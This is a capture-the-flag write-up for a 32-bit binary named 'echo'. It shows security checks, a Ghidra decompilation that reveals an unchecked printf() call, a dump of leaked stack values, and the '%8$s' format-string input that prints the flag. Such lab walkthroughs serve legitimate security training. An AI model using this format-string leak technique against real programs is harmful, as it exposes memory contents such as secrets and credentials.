# echo

Start with some basic file enumeration

```s
$ file echo
echo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a5f76d1d59c0d562ca051cb171db19b5f0bd8fe7, not stripped
$ pwn checksec echo               
[*] 'echo'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Looks like the NX bit is enabled. If we want code execution, we'll have to perform ret2libc. Lets look at the `main` function in Ghidra:

```c

void main(undefined4 param_1,undefined4 param_2)

{
  __gid_t __rgid;
  FILE *flag_fh;
  int in_GS_OFFSET;
  char user_input [64];
  char flag_buf [64];
  undefined4 local_14;
  undefined4 *puStack_c;
  
  puStack_c = &param_1;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  memset(user_input,0,64);
  memset(user_input,0,64);
  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  flag_fh = fopen("flag.txt","r");
  if (flag_fh == (FILE *)0x0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running  this on the shell server."
        );
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  fgets(flag_buf,64,flag_fh);
  do {
    printf("> ");
    fgets(user_input,64,stdin);
    printf(user_input);
  } while( true );
}


```

Looks like there is a format string vulnerability. It also looks like the `flag` is being stored on the stack. I wrote a simple leak application to leak values off the stack:

```s
$ ./leak.py
1 : 40
2 : f7e1d620
3 : 8048647
4 : 0
5 : 1
6 : f7fc14a0
7 : ffffce24
8 : ffffcd0c
9 : 3e8
10 : 804b1a0
11 : 24313125
12 : a78
13 : 0
14 : 0
15 : 0
16 : 0
17 : 0
18 : 0
19 : 0
20 : 0
21 : 0
22 : 0
23 : 0
24 : 0
25 : 0
26 : 0
27 : 67616c66
28 : 616c667b
29 : a7d67
30 : 0
31 : ffffdf8d
```

I start trying to print these values off as strings:

```s
$ ./echo 
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %6$s

> %7$s

> %8$s
flag{flag}

> 

```